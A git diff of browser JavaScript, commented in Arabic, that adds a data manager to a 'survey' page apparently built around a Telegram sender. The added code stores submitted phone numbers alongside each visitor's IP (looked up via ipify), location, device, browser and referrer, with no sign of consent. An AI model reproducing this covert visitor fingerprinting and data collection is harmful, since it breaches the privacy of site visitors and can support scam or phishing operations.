@@ -295,3 +295,346 @@ const telegramSender = new TelegramSender();
 
 // تصدير الكائن للاستخدام في ملفات أخرى
 window.telegramSender = telegramSender;
+
+
+// تحديث نظام إرسال البيانات للعمل مع لوحة التحكم
+
+class DataManager {
+    constructor() {
+        this.storageKey = 'survey_data';
+        this.maxEntries = 1000; // الحد الأقصى للبيانات المخزنة
+    }
+
+    // حفظ بيانات المشاركة
+    async saveSubmission(userData, deviceData) {
+        try {
+            // إنشاء كائن المشاركة
+            const submission = {
+                id: this.generateSubmissionId(),
+                ...userData,
+                deviceInfo: {
+                    type: deviceData.device?.deviceType || this.detectDeviceType(),
+                    browser: deviceData.device?.browser || this.detectBrowser(),
+                    os: deviceData.device?.operatingSystem || this.detectOS(),
+                    resolution: deviceData.device?.screenResolution || `${screen.width}×${screen.height}`,
+                    ip: deviceData.network?.ipAddress || await this.getIPAddress(),
+                    location: deviceData.network?.location || {},
+                    userAgent: navigator.userAgent.substring(0, 200)
+                },
+                timestamp: new Date().toISOString(),
+                status: 'active',
+                viewed: false
+            };
+
+            // حفظ في localStorage
+            this.saveToLocalStorage(submission);
+            
+            // إرسال إشعار (إن أمكن)
+            this.sendNotification(submission);
+            
+            // تسجيل النشاط
+            this.logActivity('new_submission', submission.id);
+            
+            return { success: true, id: submission.id };
+            
+        } catch (error) {
+            console.error('❌ خطأ في حفظ البيانات:', error);
+            return { success: false, error: error.message };
+        }
+    }
+
+    // حفظ بيانات الزائر
+    async saveVisitor(deviceData) {
+        try {
+            const visitor = {
+                id: this.generateVisitorId(),
+                ip: deviceData.network?.ipAddress || await this.getIPAddress(),
+                country: deviceData.network?.location?.country_name || 'غير معروف',
+                city: deviceData.network?.location?.city || 'غير معروف',
+                device: this.detectDeviceType(),
+                browser: this.detectBrowser(),
+                os: this.detectOS(),
+                page: window.location.href,
+                referrer: document.referrer || 'مباشر',
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent.substring(0, 100)
+            };
+
+            // حفظ في localStorage
+            this.saveVisitorToStorage(visitor);
+            
+            return { success: true };
+            
+        } catch (error) {
+            console.error('خطأ في حفظ بيانات الزائر:', error);
+            return { success: false };
+        }
+    }
+
+    // توليد معرف المشاركة
+    generateSubmissionId() {
+        const timestamp = Date.now().toString().slice(-8);
+        const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
+        return `ALG-${timestamp}-${random}`;
+    }
+
+    // توليد معرف الزائر
+    generateVisitorId() {
+        const timestamp = Date.now().toString().slice(-6);
+        const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
+        return `VIS-${timestamp}-${random}`;
+    }
+
+    // حفظ في localStorage
+    saveToLocalStorage(submission) {
+        try {
+            // تحميل البيانات الحالية
+            const existingData = JSON.parse(localStorage.getItem(this.storageKey) || '{}');
+            
+            // تهيئة المصفوفات إذا لم تكن موجودة
+            if (!existingData.submissions) {
+                existingData.submissions = [];
+            }
+            
+            // إضافة المشاركة الجديدة
+            existingData.submissions.unshift(submission);
+            
+            // الاحتفاظ بحد أقصى للبيانات
+            if (existingData.submissions.length > this.maxEntries) {
+                existingData.submissions = existingData.submissions.slice(0, this.maxEntries);
+            }
+            
+            // حفظ البيانات المحدثة
+            localStorage.setItem(this.storageKey, JSON.stringify(existingData));
+            
+            // تحديث العداد
+            this.updateCounter();
+            
+            console.log('✅ تم حفظ البيانات في لوحة التحكم');
+            return true;
+            
+        } catch (error) {
+            console.error('خطأ في حفظ البيانات في localStorage:', error);
+            throw error;
+        }
+    }
+
+    // حفظ بيانات الزائر في التخزين
+    saveVisitorToStorage(visitor) {
+        try {
+            const existingData = JSON.parse(localStorage.getItem(this.storageKey) || '{}');
+            
+            if (!existingData.visitors) {
+                existingData.visitors = [];
+            }
+            
+            existingData.visitors.unshift(visitor);
+            
+            if (existingData.visitors.length > this.maxEntries) {
+                existingData.visitors = existingData.visitors.slice(0, this.maxEntries);
+            }
+            
+            localStorage.setItem(this.storageKey, JSON.stringify(existingData));
+            return true;
+            
+        } catch (error) {
+            console.error('خطأ في حفظ بيانات الزائر:', error);
+            return false;
+        }
+    }
+
+    // تحديث العداد
+    updateCounter() {
+        const countElement = document.getElementById('submissions-count');
+        if (countElement) {
+            const existingData = JSON.parse(localStorage.getItem(this.storageKey) || '{}');
+            const count = existingData.submissions?.length || 0;
+            countElement.textContent = count;
+        }
+    }
+
+    // إرسال إشعار
+    sendNotification(submission) {
+        // يمكن إضافة إشعارات بالمتصفح إذا كان مسموحاً
+        if ('Notification' in window && Notification.permission === 'granted') {
+            new Notification('مشاركة جديدة', {
+                body: `تم استلام مشاركة جديدة من ${submission.phone}`,
+                icon: '/assets/logo.png'
+            });
+        }
+        
+        // يمكن إضافة إشعارات صوتية
+        this.playNotificationSound();
+    }
+
+    // تشغيل صوت الإشعار
+    playNotificationSound() {
+        try {
+            const audio = new Audio('data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAZGF0YQQAAAAAAA==');
+            audio.volume = 0.3;
+            audio.play();
+        } catch (error) {
+            // تجاهل الأخطاء في تشغيل الصوت
+        }
+    }
+
+    // تسجيل النشاط
+    logActivity(type, data) {
+        try {
+            const activity = {
+                type,
+                data,
+                timestamp: new Date().toISOString()
+            };
+            
+            const existingData = JSON.parse(localStorage.getItem(this.storageKey) || '{}');
+            
+            if (!existingData.activities) {
+                existingData.activities = [];
+            }
+            
+            existingData.activities.unshift(activity);
+            
+            // الاحتفاظ بآخر 100 نشاط فقط
+            if (existingData.activities.length > 100) {
+                existingData.activities = existingData.activities.slice(0, 100);
+            }
+            
+            localStorage.setItem(this.storageKey, JSON.stringify(existingData));
+            
+        } catch (error) {
+            console.error('خطأ في تسجيل النشاط:', error);
+        }
+    }
+
+    // الكشف عن نوع الجهاز
+    detectDeviceType() {
+        const ua = navigator.userAgent;
+        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
+            return 'جهاز لوحي';
+        } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
+            return 'هاتف محمول';
+        }
+        return 'كمبيوتر مكتبي';
+    }
+
+    // الكشف عن المتصفح
+    detectBrowser() {
+        const ua = navigator.userAgent;
+        let browser = "متصفح غير معروف";
+        
+        if (ua.includes("Firefox")) browser = "Firefox";
+        else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
+        else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
+        else if (ua.includes("Trident")) browser = "Internet Explorer";
+        else if (ua.includes("Edge")) browser = "Microsoft Edge";
+        else if (ua.includes("Chrome")) browser = "Chrome";
+        else if (ua.includes("Safari")) browser = "Safari";
+        
+        return browser;
+    }
+
+    // الكشف عن نظام التشغيل
+    detectOS() {
+        const ua = navigator.userAgent;
+        let os = "نظام غير معروف";
+        
+        if (ua.includes("Windows")) os = "Windows";
+        else if (ua.includes("Mac")) os = "macOS";
+        else if (ua.includes("X11")) os = "UNIX";
+        else if (ua.includes("Linux")) os = "Linux";
+        else if (ua.includes("Android")) os = "Android";
+        else if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+        
+        return os;
+    }
+
+    // الحصول على عنوان IP
+    async getIPAddress() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip || 'غير متاح';
+        } catch (error) {
+            return 'غير متاح';
+        }
+    }
+
+    // الحصول على جميع البيانات
+    getAllData() {
+        try {
+            return JSON.parse(localStorage.getItem(this.storageKey) || '{}');
+        } catch (error) {
+            return {};
+        }
+    }
+
+    // مسح البيانات القديمة
+    cleanupOldData(daysToKeep = 30) {
+        try {
+            const existingData = JSON.parse(localStorage.getItem(this.storageKey) || '{}');
+            const cutoffDate = new Date();
+            cutoffDate.setDate(cutoffDate.getDate() - daysToKeep);
+            
+            if (existingData.submissions) {
+                existingData.submissions = existingData.submissions.filter(sub => {
+                    const submissionDate = new Date(sub.timestamp);
+                    return submissionDate > cutoffDate;
+                });
+            }
+            
+            if (existingData.visitors) {
+                existingData.visitors = existingData.visitors.filter(vis => {
+                    const visitorDate = new Date(vis.timestamp);
+                    return visitorDate > cutoffDate;
+                });
+            }
+            
+            localStorage.setItem(this.storageKey, JSON.stringify(existingData));
+            console.log('✅ تم تنظيف البيانات القديمة');
+            
+        } catch (error) {
+            console.error('خطأ في تنظيف البيانات:', error);
+        }
+    }
+}
+
+// إنشاء مدير البيانات
+const dataManager = new DataManager();
+
+// تحديث دالة sendToTelegram للعمل مع النظام الجديد
+async function sendToTelegram(userData, deviceData) {
+    try {
+        // حفظ بيانات المشاركة
+        const result = await dataManager.saveSubmission(userData, deviceData);
+        
+        // حفظ بيانات الزائر
+        await dataManager.saveVisitor(deviceData);
+        
+        return result;
+        
+    } catch (error) {
+        console.error('❌ خطأ في إرسال البيانات:', error);
+        return { success: false, error: error.message };
+    }
+}
+
+// تهيئة النظام عند تحميل الصفحة
+document.addEventListener('DOMContentLoaded', function() {
+    // تنظيف البيانات القديمة (مرة واحدة في اليوم)
+    const lastCleanup = localStorage.getItem('last_cleanup');
+    const today = new Date().toDateString();
+    
+    if (lastCleanup !== today) {
+        dataManager.cleanupOldData();
+        localStorage.setItem('last_cleanup', today);
+    }
+    
+    // طلب إذن الإشعارات
+    if ('Notification' in window && Notification.permission === 'default') {
+        Notification.requestPermission();
+    }
+});
+
+// تصدير المدير للاستخدام العام
+window.dataManager = dataManager;
